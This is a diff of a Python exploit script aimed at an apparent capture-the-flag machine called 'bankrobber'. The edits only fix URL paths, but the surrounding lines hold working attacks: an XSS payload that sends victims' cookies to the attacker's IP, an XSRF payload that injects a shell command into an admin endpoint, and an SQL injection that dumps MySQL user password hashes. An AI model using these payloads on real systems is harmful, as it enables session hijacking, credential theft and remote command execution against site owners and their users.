@@ -49,12 +49,12 @@ def send_xsrf():
         "comment": "<script>const req = new XMLHttpRequest();const params = 'cmd=dir | ping " + args.localIp + "';req.open('POST', 'http://localhost/admin/backdoorchecker.php', true);req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');req.send(params);</script>",
     }
 
-    tr_response = session.post("http://" + args.targetIp + "user/transfer.php", data=transfer_data)
+    tr_response = session.post("http://" + args.targetIp + "/user/transfer.php", data=transfer_data)
     print(str(tr_response.status_code) + "; XSRF send, waiting for response cookie..")
 
 
 def send_sqli():
-    search_res = session.post("http://" + args.targetIp + "admin/search.php",
+    search_res = session.post("http://" + args.targetIp + "/admin/search.php",
                               data={"term": "1' UNION SELECT user,password,3 from mysql.user;-- -"})
 
 
@@ -68,7 +68,7 @@ def send_xss():
         "pounds": "Submit Query"
     }
 
-    session.post(args.targetIp + "login.php", data=login_data)
+    session.post(args.targetIp + "/login.php", data=login_data)
     is_logged = session.get(args.targetIp + "user/")
     if "You're not authorized" in is_logged.text:
         raise Exception("Your are not logged into bankrobber")
@@ -80,7 +80,7 @@ def send_xss():
         "comment": '<script>new Image().src="http://' + args.localIp + '/cookie?c="+btoa(document.cookie);</script>',
     }
 
-    tr_response = session.post("http://" + args.targetIp + "user/transfer.php", data=transfer_data)
+    tr_response = session.post("http://" + args.targetIp + "/user/transfer.php", data=transfer_data)
     print(str(tr_response.status_code) + "; XSS send, waiting for response cookie..")
 
 
@@ -109,7 +109,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             "pounds": "Submit Query"
         }
 
-        is_logged = session.post("http://" + args.targetIp + "login.php", data=login_data)
+        is_logged = session.post("http://" + args.targetIp + "/login.php", data=login_data)
 
         if "You're not authorized" in is_logged.text:
             raise Exception("Your are not logged as admin into bankrobber")
